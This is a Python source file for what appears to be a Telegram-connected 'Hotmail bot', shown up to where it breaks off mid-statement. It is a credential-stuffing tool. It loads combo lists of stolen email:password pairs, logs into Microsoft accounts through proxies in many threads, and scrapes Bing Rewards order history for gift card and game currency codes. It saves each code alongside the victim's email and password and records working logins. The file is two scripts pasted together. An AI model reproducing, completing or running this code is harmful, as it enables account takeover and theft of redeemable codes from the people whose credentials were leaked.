#!/usr/bin/env python3
"""
AKAZA Hotmail bot - THE ULTIMATE SUPREME INTEGRATED VERSION
FULL FLUX.PY (2000+) + FULL HIT.PY (1900+) LOGIC
HIGH CPM (200+), FULL DEEP CAPTURE, ADVANCED ADMIN/MOD SYSTEM
"""
import re, json, uuid, sqlite3, logging, asyncio
import time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler,
    MessageHandler, CallbackQueryHandler, ContextTypes, filters)

urllib3.disable_warnings()

# ============================================================================
# FLUX.PY SOURCE (2000+ lines)
# ============================================================================
#!/usr/bin/env python3
"""
Multi-Platform Rewards Scraper - CLI with Category Selection
Supports Minecraft, Roblox, League of Legends, Overwatch, Gift Cards, and All
Self-contained authentication without external dependencies
"""

import requests
import threading
import time
from datetime import datetime
from pathlib import Path
import sys
import os
import re
from bs4 import BeautifulSoup
import json
import warnings
try:
    from tkinter import Tk, filedialog
except ImportError:
    Tk = None
    filedialog = None
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.panel import Panel

# ============================================================================
# SORTING FUNCTIONALITY
# ============================================================================

# Code pattern for extracting codes
CODE_REGEX = re.compile(r"\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b")

# Amount patterns for different types
ROBLOX_AMOUNT_REGEX = re.compile(r"(\d+)\s*(?:robux|rbx|r\$)", re.IGNORECASE)
MINECRAFT_AMOUNT_REGEX = re.compile(r"(\d+)\s*(?:minecoins|coins|minecraft coins)", re.IGNORECASE)
GIFTCARD_AMOUNT_REGEX = re.compile(r"\$(\d+)(?:\.\d{2})?")
LEAGUE_AMOUNT_REGEX = re.compile(r"(\d+)\s*(?:rp|riot points)", re.IGNORECASE)
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import cpu_count
from urllib.parse import urlparse, parse_qs

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

console = Console(force_terminal=True, width=100, legacy_windows=False)
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

# ============================================================================
# SORTING FUNCTIONS
# ============================================================================

def extract_amount_and_type(title):
    """Extract amount and type from title"""
    title = title.lower()

    # Check for Robux
    robux_match = ROBLOX_AMOUNT_REGEX.search(title)
    if robux_match:
        return int(robux_match.group(1)), 'robux'

    # Check for Minecraft coins
    minecraft_match = MINECRAFT_AMOUNT_REGEX.search(title)
    if minecraft_match:
        return int(minecraft_match.group(1)), 'minecraft'

    # Check for League of Legends RP
    league_match = LEAGUE_AMOUNT_REGEX.search(title)
    if league_match:
        return int(league_match.group(1)), 'league'

    # Check for gift cards
    giftcard_match = GIFTCARD_AMOUNT_REGEX.search(title)
    if giftcard_match:
        return int(giftcard_match.group(1)), 'giftcard'

    return 0, 'unknown'

def format_sorted_output(category_codes, all_results):
    """Format sorted codes with clean output"""
    lines = []

    # Group by amount and type
    amount_groups = {}

    for code_info in category_codes:
        amount, code_type = extract_amount_and_type(code_info['title'])

        # Create key based on type and amount
        key = f"{code_type}_{amount}"
        if key not in amount_groups:
            amount_groups[key] = []
        amount_groups[key].append(code_info)

    # Sort groups by amount (descending) within each type
    sorted_groups = {}
    for key in amount_groups:
        code_type, amount = key.split('_', 1)
        if code_type not in sorted_groups:
            sorted_groups[code_type] = []
        sorted_groups[code_type].append((int(amount), amount_groups[key]))

    # Sort each type by amount (descending)
    for code_type in sorted_groups:
        sorted_groups[code_type].sort(key=lambda x: x[0], reverse=True)

    # Generate output
    lines.append(f"🎮 SORTED CODES 🎮")
    lines.append("=" * 60)
    lines.append("")

    for code_type in sorted(sorted_groups.keys()):
        lines.append(f"📋 {code_type.upper()} CODES")
        lines.append("-" * 50)

        for amount, codes in sorted_groups[code_type]:
            # Remove duplicates and count
            unique_codes = {}
            for code_info in codes:
                code = code_info['code']
                if code not in unique_codes:
                    unique_codes[code] = []
                unique_codes[code].append(code_info)

            # Display codes in clean format
            for code, code_infos in unique_codes.items():
                if len(code_infos) == 1:
                    info = code_infos[0]
                    if amount > 0:
                        if code_type == 'giftcard':
                            # Extract gift card type from title
                            title = info['title'].upper()
                            lines.append(f"{code} - {title}")
                        else:
                            lines.append(f"{code} - {amount} {code_type.upper()}")
                    else:
                        lines.append(f"{code}")
                    # Add redemption URL for gift cards
                    if code_type == 'giftcard':
                        redemption_result = next((r for r in all_results if r['code'] == code and r.get('redemption_url')), None)
                        if redemption_result:
                            lines.append(f"Redemption URL: {redemption_result['redemption_url']}")
                else:
                    info = code_infos[0]
                    if amount > 0:
                        if code_type == 'giftcard':
                            # Extract gift card type from title
                            title = info['title'].upper()
                            lines.append(f"{code} (x{len(code_infos)}) - {title}")
                        else:
                            lines.append(f"{code} (x{len(code_infos)}) - {amount} {code_type.upper()}")
                    else:
                        lines.append(f"{code} (x{len(code_infos)})")
                    # Add redemption URL for gift cards
                    if code_type == 'giftcard':
                        redemption_result = next((r for r in all_results if r['code'] == code and r.get('redemption_url')), None)
                        if redemption_result:
                            lines.append(f"Redemption URL: {redemption_result['redemption_url']}")

        lines.append("")

    # Summary
    total_codes = sum(len(group) for group in amount_groups.values() for group in group)
    lines.append("📊 SUMMARY")
    lines.append("=" * 60)
    lines.append(f"Total codes: {total_codes}")
    lines.append(f"Categories: {len(sorted_groups)}")
    lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    return "\n".join(lines) + "\n"

def sort_and_save_codes(results_folder, category_codes, category_name, all_results):
    """Sort codes and save to file"""
    if not category_codes:
        return

    console.print(f"\n[🔄] Sorting {len(category_codes)} {category_name} codes...", style="cyan")

    # Format sorted output
    formatted_output = format_sorted_output(category_codes, all_results)

    # Save to file
    sorted_file = results_folder / f"sorted_{category_name}.txt"
    with open(sorted_file, 'w', encoding='utf-8') as f:
        f.write(formatted_output)

    console.print(f"[✓] Sorted codes saved to: {sorted_file}", style="green")

    # Show preview
    lines = formatted_output.split('\n')
    console.print("\n[📋] Preview:", style="yellow")
    console.print("=" * 60, style="cyan")
    for i, line in enumerate(lines[:20]):  # Show first 20 lines
        console.print(line)
    if len(lines) > 20:
        console.print(f"... and {len(lines) - 20} more lines", style="yellow")
    console.print("=" * 60, style="cyan")

# ============================================================================
# SELF-CONTAINED AUTHENTICATION FUNCTIONS
# ============================================================================
# Global variables from original
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

def create_optimized_session(proxy=None):
    """Create optimized session with headers and optional proxy"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })

    # Add proxy if provided
    if proxy:
        session.proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

    return session

def get_urlPost_sFTTag(session):
    """EXACT function from original"""
    maxretries = 3
    attempts = 0

    while attempts < maxretries:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                      'Accept-Language': 'en-US,en;q=0.9',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Connection': 'keep-alive',
                      'Upgrade-Insecure-Requests': '1'}

            timeout_val = 10
            text = session.get(sFTTag_url, headers=headers, timeout=timeout_val, verify=False).text

            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                   re.search('value="(.+?)"', text, re.S) or \
                   re.search("sFTTag:'(.+?)'", text, re.S) or \
                   re.search('sFTTag:"(.+?)"', text, re.S) or \
                   re.search('name="PPFT".*?value="(.+?)"', text, re.S)

            if match:
                sFTTag = match.group(1)
                match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                       re.search("urlPost:'(.+?)'", text, re.S) or \
                       re.search('urlPost:"(.+?)"', text, re.S) or \
                       re.search('<form.*?action="(.+?)"', text, re.S)

                if match:
                    urlPost = match.group(1)
                    urlPost = urlPost.replace('&amp;', '&')
                    return (urlPost, sFTTag, session)
        except Exception as e:
            pass

        attempts += 1
        time.sleep(0.1)

    return (None, None, session)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    """EXACT function from original"""
    maxretries = 3
    tries = 0

    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded',
                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                      'Accept-Language': 'en-US,en;q=0.9',
                      'Accept-Encoding': 'gzip, deflate, br',
                      'Connection': 'close'}

            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True,
                                        timeout=10, verify=False)

            # Check for successful login with token
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)

            # Check for 2FA flow
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)

                    if ipt and pprid and uaid:
                        data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}

                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                        if action:
                            ret = session.post(action.group(), data=data, allow_redirects=True,
                                             timeout=10, verify=False)

                            return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if return_url:
                                fin = session.get(return_url.group(), allow_redirects=True,
                                                timeout=10, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                if token != 'None':
                                    return (token, session)
                except:
                    pass

            # Check for 2FA indicators
            elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                return ('2FA', session)

            # Check for invalid credentials
            elif any(value in login_request.text.lower() for value in [
                'password is incorrect',
                "account doesn't exist",
                "that microsoft account doesn't exist",
                'sign in to your microsoft account',
                "tried to sign in too many times with an incorrect account or password",
                'help us protect your account'
            ]):
                return ('None', session)

        except Exception as e:
            pass

        tries += 1
        time.sleep(0.1)

    return ('None', session)

class Settings:

    DEFAULT_SETTINGS = {
        'timeout': 5,
        'max_threads': 100,
        'retry_count': 2,
        'save_invalid': False,
        'auto_save': True,
        'selected_category': 'All',
    }

    def __init__(self):
        self.settings_file = Path(__file__).parent / "settings.json"
        self.settings = self.load()

    def load(self):
        """Load settings from file or use defaults"""
        if self.settings_file.exists():
            try:
                with open(self.settings_file, 'r') as f:
                    return json.load(f)
            except:
                return self.DEFAULT_SETTINGS.copy()
        return self.DEFAULT_SETTINGS.copy()

    def save(self):
        """Save settings to file"""
        try:
            with open(self.settings_file, 'w') as f:
                json.dump(self.settings, f, indent=2)
            console.print("[bold green][✓] Settings saved[/bold green]")
        except Exception as e:
            console.print(f"[bold red][!] Failed to save settings: {e}[/bold red]")

    def get(self, key, default=None):
        """Get setting value"""
        return self.settings.get(key, default)

    def set(self, key, value):
        """Set setting value"""
        self.settings[key] = value


class ComboParser:
    """Parse combo file lines to extract EMAIL:PASS - ULTRA FAST with 1000 threads"""

    def __init__(self, file_path):
        self.file_path = file_path
        self.accounts = []

    def parse(self):
        """Parse combo file with multi-threading"""
        try:
            with open(self.file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            # Ultra-fast parsing with list comprehension
            self.accounts = []
            for line in lines:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts
                        if '@' in email and len(email) > 5 and len(password) > 3:
                            self.accounts.append((email, password))

            return self.accounts
        except Exception as e:
            console.print(f"[!] Error parsing combo file: {e}", style="red")
            return []

class MultiPlatformScraper:
    """Multi-platform scraper with category selection"""

    def __init__(self, accounts, settings, category, proxy_manager=None):
        self.accounts = accounts
        self.settings = settings
        self.category = category
        self.proxy_manager = proxy_manager
        self.results = []
        self.valid_accounts = []
        self.invalid_accounts = []
        self.lock = threading.Lock()

        # Initialize real-time file saving
        self.timestamp = datetime.now().strftime('%m%d%Y%H%M')
        self.results_folder = Path(f"results-{self.timestamp}")
        self.results_folder.mkdir(exist_ok=True)
        self.category_files = {}  # Track open file handles
        self.saved_codes = set()  # Track codes already saved to avoid duplicates
        self.category_config = {
            'Minecraft': {
                'keywords': ['minecraft', 'minecoins', 'minecraft minecoins', 'minecoin', 'minecraft coins'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Minecraft',
                'amount_pattern': r'(\d+)\s*(?:minecoins|coins|minecraft coins)'
            },
            'Roblox': {
                'keywords': ['roblox', 'robux', 'roblox robux', 'roblox digital', 'roblox card'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Roblox',
                'amount_pattern': r'(\d+)\s*(?:robux|rbx|r\$)'
            },
            'League of Legends': {
                'keywords': ['league of legends', 'lol', 'riot points', 'rp', 'league rp'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'League of Legends',
                'amount_pattern': r'(\d+)\s*(?:rp|riot points)'
            },
            'Overwatch': {
                'keywords': ['overwatch', 'overwatch coins', 'overwatch league tokens', 'owl tokens'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Overwatch',
                'amount_pattern': r'(\d+)\s*(?:coins|tokens|league tokens)'
            },
            'Sea of Thieves': {
                'keywords': ['sea of thieves', 'sea thieves', 'ancient coins', 'sof coins'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Sea of Thieves',
                'amount_pattern': r'(\d+)\s*(?:coins|ancient coins)'
            },
            'Game Pass': {
                'keywords': ['game pass', 'xbox game pass', 'gamepass', 'xbox gamepass'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Game Pass',
                'amount_pattern': r'(\d+)\s*(?:month|months|day|days)'
            },
            'GIFTCARDS': {
                'keywords': ['gift card', 'giftcard', 'gift cards', 'amazon', 'steam', 'playstation', 'xbox', 'nintendo', 'target', 'starbucks', 'subway', 'doordash', 'uber eats', 'uber', 'walmart'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Gift Cards',
                'amount_pattern': r'\$(\d+)(?:\.\d{2})?'
            },
            'All': {
                'keywords': [],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'All Categories',
                'amount_pattern': None
            }
        }

    def save_code_realtime(self, code, info, email, password, category, redemption_url=""):
        """Save a single code to its category file in real-time"""
        # Ensure category is a string
        if not isinstance(category, str):
            category = str(category)

        # Determine file name based on category
        if category.lower() == 'unknown':
            info_lower = info.lower()
            if 'overwatch' in info_lower or 'overwatch coins' in info_lower:
                file_name = 'overwatch'
            elif 'robux' in info_lower or 'roblox' in info_lower:
                file_name = 'roblox'
            elif 'minecoins' in info_lower or 'minecraft' in info_lower:
                file_name = 'minecraft'
            elif 'rp' in info_lower or 'league' in info_lower or 'league of legends' in info_lower:
                file_name = 'leagueoflegends'
            elif 'gift' in info_lower or 'card' in info_lower or '$' in info_lower:
                file_name = 'giftcards'
            elif 'game pass' in info_lower or 'gamepass' in info_lower:
                file_name = 'gamepass'
            elif 'sea of thieves' in info_lower or 'pirates' in info_lower:
                file_name = 'seaofthieves'
            else:
                file_name = 'unknown'
        else:
            file_name = category.lower().replace(' ', '').replace('of', 'of')

        # Check if code already saved
        code_key = (code, email)
        if code_key in self.saved_codes:
            return

        self.saved_codes.add(code_key)

        # Add redemption URL if available
        if redemption_url:
            info_with_url = f"{info} | Redeem: {redemption_url}"
        else:
            info_with_url = info

        # Get or create file handle
        if file_name not in self.category_files:
            category_file = self.results_folder / f"{file_name}.txt"
            self.category_files[file_name] = open(category_file, 'w', encoding='utf-8')
            # Write header
            self.category_files[file_name].write(f"{file_name.upper()} CODES\n")
            self.category_files[file_name].write(f"{'='*50}\n\n")
            self.category_files[file_name].flush()

        # Write code to file
        file_handle = self.category_files[file_name]
        file_handle.write(f"{code}\n")
        file_handle.write(f"Account: {email}\n")
        file_handle.write(f"Password: {password}\n")
        file_handle.write(f"Info: {info_with_url}\n")
        file_handle.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file_handle.write(f"{'-'*30}\n\n")
        file_handle.flush()  # Force write to disk immediately

        console.print(f"[+] Saved to {file_name}.txt: {code} - {info}", style="green")

    def close_all_files(self):
        """Close all open file handles"""
        for file_handle in self.category_files.values():
            file_handle.close()
        self.category_files.clear()

    def save_valid_accounts_realtime(self, email, password):
        """Save valid account to valid.txt in real-time"""
        valid_file = self.results_folder / "valid.txt"

        # Check if file exists, if not create with header
        if not valid_file.exists():
            with open(valid_file, 'w', encoding='utf-8') as f:
                f.write("VALID ACCOUNTS\n")
                f.write(f"{'='*50}\n\n")

        # Append account
        with open(valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")
            f.flush()

    def detect_category_from_title(self, order_title, full_row_text=None):
        """Detect category from order title with multi-language support"""
        order_title_lower = order_title.lower()
        text_to_check = full_row_text.lower() if full_row_text else order_title_lower

        # Priority-based detection to prevent misclassification
        # Check specific categories first (with multi-language support)
        if any(keyword in text_to_check for keyword in ['overwatch', 'overwatch coins', 'owl tokens']):
            return 'Overwatch'
        elif any(keyword in text_to_check for keyword in ['sea of thieves', 'sea thieves', 'ancient coins', 'monedas', 'alijo secreto', 'tesoro oculto', 'lost chest', 'secret cache']):
            return 'Sea of Thieves'
        elif any(keyword in text_to_check for keyword in ['roblox', 'robux']):
            return 'Roblox'
        elif any(keyword in text_to_check for keyword in ['league of legends', 'lol', 'riot points', 'puntos riot', 'ra-']):
            return 'League of Legends'
        elif any(keyword in text_to_check for keyword in ['game pass', 'xbox game pass', 'gamepass']):
            return 'Game Pass'
        elif any(keyword in text_to_check for keyword in ['minecraft', 'minecoins', 'monedas minecraft']):
            return 'Minecraft'
        elif any(keyword in text_to_check for keyword in ['gift card', 'giftcard', 'amazon', 'steam', 'playstation', 'xbox', 'nintendo', 'target', 'starbucks', 'subway', 'doordash', 'uber eats', 'uber', 'walmart', 'spotify', 'premium', 'tarjeta regalo']):
            return 'GIFTCARDS'

        return 'Unknown'

    def extract_code_info(self, order_title, category, full_row_text=None):
        """Extract code info with category-specific patterns and multi-language support"""
        config = self.category_config.get(category, self.category_config['All'])
        order_title_lower = order_title.lower()

        # Special handling for 'All' category
        if category == 'All':
            detected_category = self.detect_category_from_title(order_title, full_row_text)
            if detected_category != 'Unknown':
                return self.extract_code_info(order_title, detected_category, full_row_text)

        # Extract amount based on category (with multi-language support)
        amount = None
        if config['amount_pattern']:
            amount_match = re.search(config['amount_pattern'], order_title_lower)
            if amount_match:
                amount = amount_match.group(1)

        # Additional multi-language amount detection
        if not amount:
            # Spanish/French/Portuguese number patterns
            amount_match = re.search(r'(\d+)\s*(?:monedas|coins|pièces|moedas)', order_title_lower)
            if amount_match:
                amount = amount_match.group(1)

        # Format output based on category and amount
        if category == 'Minecraft' and amount:
            return f"{amount} MINECOINS CODE FOUND"
        elif category == 'Roblox' and amount:
            return f"{amount} ROBUX CODE FOUND"
        elif category == 'League of Legends' and amount:
            return f"{amount} RP CODE FOUND"
        elif category == 'Overwatch' and amount:
            return f"{amount} OVERWATCH COINS CODE FOUND"
        elif category == 'Sea of Thieves' and amount:
            return f"{amount} ANCIENT COINS CODE FOUND"
        elif category == 'Game Pass' and amount:
            if 'month' in order_title_lower:
                return f"{amount} MONTH GAME PASS CODE FOUND"
            elif 'day' in order_title_lower:
                return f"{amount} DAY GAME PASS CODE FOUND"
            else:
                return f"GAME PASS CODE FOUND"
        elif category == 'GIFTCARDS':
            # Detect specific gift card type
            if 'amazon' in order_title_lower:
                if amount:
                    return f"${amount} AMAZON GIFT CARD FOUND"
                else:
                    return "AMAZON GIFT CARD FOUND"
            elif 'steam' in order_title_lower:
                if amount:
                    return f"${amount} STEAM GIFT CARD FOUND"
                else:
                    return "STEAM GIFT CARD FOUND"
            elif 'playstation' in order_title_lower or 'psn' in order_title_lower:
                if amount:
                    return f"${amount} PLAYSTATION GIFT CARD FOUND"
                else:
                    return "PLAYSTATION GIFT CARD FOUND"
            elif 'xbox' in order_title_lower:
                if amount:
                    return f"${amount} XBOX GIFT CARD FOUND"
                else:
                    return "XBOX GIFT CARD FOUND"
            elif 'nintendo' in order_title_lower:
                if amount:
                    return f"${amount} NINTENDO GIFT CARD FOUND"
                else:
                    return "NINTENDO GIFT CARD FOUND"
            elif 'target' in order_title_lower:
                if amount:
                    return f"${amount} TARGET GIFT CARD FOUND"
                else:
                    return "TARGET GIFT CARD FOUND"
            elif 'starbucks' in order_title_lower:
                if amount:
                    return f"${amount} STARBUCKS GIFT CARD FOUND"
                else:
                    return "STARBUCKS GIFT CARD FOUND"
            elif 'subway' in order_title_lower:
                if amount:
                    return f"${amount} SUBWAY GIFT CARD FOUND"
                else:
                    return "SUBWAY GIFT CARD FOUND"
            elif 'doordash' in order_title_lower:
                if amount:
                    return f"${amount} DOORDASH GIFT CARD FOUND"
                else:
                    return "DOORDASH GIFT CARD FOUND"
            elif 'uber eats' in order_title_lower or 'uber' in order_title_lower:
                if amount:
                    return f"${amount} UBER EATS GIFT CARD FOUND"
                else:
                    return "UBER EATS GIFT CARD FOUND"
            elif 'walmart' in order_title_lower:
                if amount:
                    return f"${amount} WALMART GIFT CARD FOUND"
                else:
                    return "WALMART GIFT CARD FOUND"
            elif 'spotify' in order_title_lower or 'premium' in order_title_lower:
                if '3 month' in order_title_lower or '3 months' in order_title_lower:
                    return "3 MONTHS SPOTIFY PREMIUM FOUND"
                elif '1 month' in order_title_lower or '1 months' in order_title_lower:
                    return "1 MONTH SPOTIFY PREMIUM FOUND"
                elif '6 month' in order_title_lower or '6 months' in order_title_lower:
                    return "6 MONTHS SPOTIFY PREMIUM FOUND"
                elif '12 month' in order_title_lower or '12 months' in order_title_lower or '1 year' in order_title_lower:
                    return "12 MONTHS SPOTIFY PREMIUM FOUND"
                else:
                    return "SPOTIFY PREMIUM FOUND"
            elif amount:
                return f"${amount} GIFT CARD FOUND"
            else:
                return "GIFT CARD FOUND"

        return f"{category.upper()} CODE FOUND"

    def login_and_scrape(self, email, password):
        """Login and scrape Microsoft Rewards with self-contained auth"""
        try:
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager and self.proxy_manager.proxy_settings.get('use_proxies', False):
                if self.proxy_manager.proxy_settings.get('rotate', False):
                    proxy = self.proxy_manager.get_next_proxy()
                else:
                    proxy = self.proxy_manager.get_random_proxy()

            # Create optimized session with proxy
            session = create_optimized_session(proxy)

            # Get PPFT token and urlPost
            urlPost, sFTTag, session = get_urlPost_sFTTag(session)

            if not urlPost or not sFTTag:
                return False

            # Login with Xbox RPS
            token_result = get_xbox_rps(session, email, password, urlPost, sFTTag)

            if isinstance(token_result, tuple):
                token, session = token_result
            else:
                return False

            # Check token validity
            if not token or token == 'None':
                return False

            if token == '2FA':
                return False

            # Get redemption codes from order history
            codes = []
            try:
                url = 'https://rewards.bing.com/redeem/orderhistory'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Referer': 'https://rewards.bing.com/',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }

                r = session.get(url, headers=headers, timeout=10, verify=False)
                text = r.text if r is not None else ''

                # Handle JavaScript auto-submit pages
                if 'fmHF' in text or 'JavaScript required to sign in' in text:
                    try:
                        soup = BeautifulSoup(text, 'html.parser')
                        form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
                        if form and form.has_attr('action'):
                            action = form['action']
                            data = {}
                            for inp in form.find_all('input'):
                                name = inp.get('name')
                                if name:
                                    data[name] = inp.get('value', '')

                            if action.startswith('/'):
                                action = 'https://login.live.com' + action

                            rr = session.post(action, data=data, timeout=10, verify=False, allow_redirects=True)
                            r2 = session.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
                            text = r2.text if r2 is not None else text
                    except:
                        pass

                # Parse order history HTML
                soup = BeautifulSoup(text, 'html.parser')

                # Extract verification token
                verification_token = ''
                try:
                    token_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
                    if token_input and token_input.has_attr('value'):
                        verification_token = token_input['value']
                except:
                    pass

                # Extract orders with relevant codes based on category
                orders = []
                table = soup.find('table', class_='table')
                rows = []

                if table and table.tbody:
                    rows = table.tbody.find_all('tr')
                elif table:
                    rows = table.find_all('tr')

                config = self.category_config.get(self.category, self.category_config['All'])

                # Define code patterns outside the loop
                code_patterns = [
                    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 5-part codes (Minecraft, Game Pass)
                    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 4-part codes (League of Legends)
                    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 3-part codes (Roblox, etc.)
                ]

                # Words to exclude (not actual codes)
                exclude_words = {
                    'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM',
                    'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS',
                    'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION',
                    'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER',
                    'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE',
                    'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER',
                    'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER',
                    'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB',
                    'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS',
                    'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND',
                    'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT',
                    'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION',
                    'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'
                }

                for row in rows:
                    cells = row.find_all(['td', 'th'])
                    if len(cells) < 3:
                        continue

                    # Get full row text for better category detection
                    full_row_text = row.get_text(strip=True)

                    # Check what buttons are in this row
                    get_code_button = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                    resend_button = row.find('button', id=lambda x: x and x.startswith('ResendEmail_'))

                    # Prioritize Get Code button, but also check if row has Get Code button even if Resend is found
                    if get_code_button:
                        # Extract action URL from button
                        action_url = get_code_button.get('data-actionurl', '')
                        # Decode HTML entities in the URL
                        action_url = action_url.replace('&amp;', '&')

                        # Use the EXACT same method as the backup
                        order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
                        # Extract order date from the second cell (usually contains date)
                        order_date = cells[1].get_text(strip=True) if len(cells) > 1 else ""
                        full_row_text = row.get_text(strip=True)
                        detected_category = self.detect_category_from_title(order_title, full_row_text)
                        code_info = self.extract_code_info(order_title, detected_category, full_row_text)

                        # Normalize action URL (use rewards.bing.com like backup)
                        if action_url.startswith('/'):
                            action_url = 'https://rewards.bing.com' + action_url

                        try:
                            # POST to action URL to retrieve code (exact backup method)
                            post_data = {}
                            if verification_token:
                                post_data['__RequestVerificationToken'] = verification_token

                            code_headers = {
